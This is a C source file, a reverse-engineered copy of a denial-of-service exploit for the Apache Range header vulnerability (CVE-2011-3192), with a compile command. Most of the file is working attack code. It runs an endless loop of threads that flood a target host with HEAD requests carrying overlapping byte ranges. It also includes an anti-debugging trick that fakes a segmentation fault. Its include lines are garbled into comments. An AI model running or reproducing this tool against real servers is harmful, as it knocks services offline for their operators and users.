
                                                /*
 * This is a reverse engineered version of the exploit for CVE-2011-3192 made
 * by ev1lut10n (http://jayakonstruksi.com/backupintsec/rapache.tgz).
 * Copyright 2011 Ramon de C Valle &lt;rcvalle@redhat.com&gt;
 * This is a reverse engineered version of the exploit by ev1lut10n that triggers a denial of service condition using a vulnerability in the Range header of Apache versions 1.3.x, 2.0.64 and below and 2.2.19 and below
 *
 * Compile with the following command:
 * gcc -Wall -pthread -o rcvalle-rapache rcvalle-rapache.c
 */

/* #include stdio; */
/* #include &lt;stdlib.h&gt; */
/* #include &lt;string.h&gt; */
/* #include &lt;sys/ptrace.h&gt; */
/* #include &lt;sys/types.h&gt; */
/* #include &lt;sys/socket.h&gt; */
/* #include &lt;netdb.h&gt; */
/* #include &lt;unistd.h&gt; */
/* #include &lt;pthread.h&gt; */

void ptrace_trap(void) __attribute__ ((constructor));

void ptrace_trap(void) {
    if (ptrace(PTRACE_TRACEME, 0, 0, 0) &lt; 0) {
        write(fileno(stdout), &quot;Segmentation fault\n&quot;, 19);
        exit(-1);
    }
}

void w4rn41dun14mu(int attr, int fg, int bg)
{
    char command[13];

    sprintf(command, &quot;%c[%d;%d;%dm&quot;, 0x1b, attr, fg+30, bg+40);
    printf(&quot;%s&quot;, command);
}

void banner()
{
    w4rn41dun14mu(0, 1, 0);
    fwrite(&quot;Remote Apache Denial of Service Exploit by ev1lut10n\n&quot;, 53, 1,
           stdout);
}

void gime_er_mas()
{
    printf(&quot;%c%s&quot;, 0x1b, &quot;[2J&quot;);
    printf(&quot;%c%s&quot;, 0x1b, &quot;[1;1H&quot;);
    puts(&quot;\nsorry dude there's an error...&quot;);
}

struct thread_info {
    pthread_t thread_id;
    int       thread_num;
    char     *argv_string;
};

static void * thread_start(void *arg)
{
    struct thread_info *tinfo = (struct thread_info *) arg;
    char hostname[64];
    int j;

    strcpy(hostname, tinfo-&gt;argv_string);

    j = 0;
    while (j != 10) {
        struct addrinfo hints;
        struct addrinfo *result, *rp;
        int sfd, s;
        ssize_t nwritten;

        memset(&amp;hints, 0, sizeof(struct addrinfo));
        hints.ai_family = AF_UNSPEC;
        hints.ai_socktype = SOCK_STREAM;
        hints.ai_flags = 0;
        hints.ai_protocol = 0;

        s = getaddrinfo(hostname, &quot;http&quot;, &amp;hints, &amp;result);
        if (s != 0) {
            fprintf(stderr, &quot;getaddrinfo: %s\n&quot;, gai_strerror(s));
            exit(EXIT_FAILURE);
        }

        for (rp = result; rp != NULL; rp = rp-&gt;ai_next) {
            sfd = socket(rp-&gt;ai_family, rp-&gt;ai_socktype, rp-&gt;ai_protocol);
            if (sfd == -1)
                continue;

            if (connect(sfd, rp-&gt;ai_addr, rp-&gt;ai_addrlen) == -1)
                close(sfd);
        }

        if (result != NULL)
            freeaddrinfo(result);

        nwritten = write(sfd, &quot;HEAD / HTTP/1.1\n&quot;
                              &quot;Host:localhost\n&quot;
                              &quot;Range:bytes=0-,0-\n&quot;
                              &quot;Accept-Encoding: gzip&quot;, 71);
        if (nwritten == -1)
            close(sfd);

        usleep(300000);

        j++;
    }

    return 0;
}

int main(int argc, char *argv[])
{
    int i;
    struct thread_info tinfo;

    banner();

    if (argc &lt;= 1) {
        w4rn41dun14mu(0, 2, 0);
        fwrite(&quot;\n[-] Usage : ./rapache hostname\n&quot;, 32, 1, stdout);
        return 0;
    }

    w4rn41dun14mu(0, 3, 0);
    printf(&quot;[+] Attacking %s please wait  in minutes ...\n&quot;, argv[1]);

    while (1) {
        i = 0;
        while (i != 50) {
            tinfo.thread_num = i;
            tinfo.argv_string = argv[1];

            pthread_create(&amp;tinfo.thread_id, NULL, &amp;thread_start, &amp;tinfo);

            usleep(500000);

            i++;
        }
    }
}
